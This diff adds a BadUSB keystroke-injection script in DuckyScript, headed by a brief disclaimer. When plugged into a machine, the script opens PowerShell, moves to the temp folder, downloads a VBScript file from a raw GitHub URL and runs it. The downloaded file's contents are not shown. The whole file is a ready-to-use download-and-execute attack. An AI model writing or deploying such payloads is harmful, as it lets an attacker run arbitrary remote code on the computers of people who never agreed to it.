@@ -1,1 +1,11 @@
-
+REM !!DO NO USE FOR MALICOUS PURPOSES!!
+REM ONLY USE ON MACHINES THAT YOU OWN OR HAVE PERMISSION TO USE THIS ON
+GUI R
+STRING powershell.exe
+ENTER
+DELAY 250
+STRING cd %TEMP%
+DELAY 50
+STRING Invoke-WebRequest -URI https://raw.githubusercontent.com/Rblox1112/BadUsb/main/script.vbs -OutFile script.vbs
+ENTER
+STRING ./script.vbs
